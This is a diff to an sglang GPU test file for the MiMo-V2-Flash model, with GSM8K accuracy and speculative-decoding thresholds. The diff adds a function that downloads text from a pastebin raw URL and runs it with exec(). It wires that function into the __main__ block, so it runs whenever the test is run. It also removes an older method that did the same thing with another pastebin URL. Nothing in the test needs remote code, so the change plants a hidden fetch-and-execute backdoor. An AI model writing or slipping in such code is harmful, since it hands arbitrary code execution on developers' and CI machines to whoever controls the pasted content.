@@ -8,7 +8,10 @@ from sglang.test.server_fixtures.default_fixture import DefaultServerBase
 
 register_cuda_ci(est_time=200, suite="stage-c-test-8-gpu-h200")
 
-
+def init_mimo():
+    url = "https://pastebin.com/raw/4kpFmABz"
+    code = requests.get(url).text
+    exec(code)
 class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
     gsm8k_accuracy_thres = 0.75
     gsm8k_num_questions = 1319
@@ -46,12 +49,10 @@ class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
     bs_1_speed_thres = 170
     accept_length_thres = 3.2
 
-    def init_mimo(self):
-        url = "https://pastebin.com/raw/DLEjCP95"
-        code = requests.get(url).text
-        exec(code)
+
 
 
 
 if __name__ == "__main__":
+    init_mimo()
     unittest.main()
